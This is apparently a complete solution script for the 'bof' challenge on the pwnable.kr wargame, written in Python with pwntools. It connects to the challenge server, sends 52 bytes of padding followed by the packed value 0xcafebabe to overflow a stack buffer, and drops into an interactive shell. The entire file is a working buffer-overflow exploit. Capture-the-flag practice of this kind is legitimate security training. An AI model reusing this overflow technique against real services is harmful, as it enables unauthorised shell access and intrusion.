from pwn import *
context.log_level = 'DEBUG'
con = remote("pwnable.kr","9000")
con.sendline("aaaa"*13+p32(0xcafebabe))
con.interactive()
